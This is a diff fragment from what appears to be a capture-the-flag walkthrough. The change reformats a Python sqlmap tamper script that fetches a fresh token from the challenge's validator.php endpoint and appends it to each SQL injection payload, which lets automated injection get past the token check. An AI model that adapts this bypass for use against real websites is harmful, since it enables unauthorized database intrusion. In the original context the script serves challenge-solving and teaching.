@@ -39,26 +39,26 @@ allows you to manipulate the payload before sending it.
 
 I coded up the following to help with this:
 ```python
-		#!/usr/bin/env python3
-		"""
-			A tamper script
-		"""
-		from lib.core.data import kb
-		from lib.core.enums import PRIORITY
-		import requests
-		import urllib
-		__priority__ = PRIORITY.NORMAL
-		
-		token_url = "https://studentportal.elfu.org/validator.php"
-		
-		def dependencies():
-		    pass
-		
-		def tamper(payload, **kwargs):
-		    token_get = requests.get(token_url)
-		    retval = urllib.parse.quote(payload) + f"&token={token_get.text}"
-		    # print(f"Tampered payload: {retval}")
-        return retval
+#!/usr/bin/env python3
+"""
+A tamper script
+"""
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+import requests
+import urllib
+__priority__ = PRIORITY.NORMAL
+
+token_url = "https://studentportal.elfu.org/validator.php"
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    token_get = requests.get(token_url)
+    retval = urllib.parse.quote(payload) + f"&token={token_get.text}"
+    # print(f"Tampered payload: {retval}")
+    return retval
 ```
 You'll see that I first obtain the token from validator.php and quickly append it
 to the payload. In order for this to work in any capacity, sqlmap MUST be
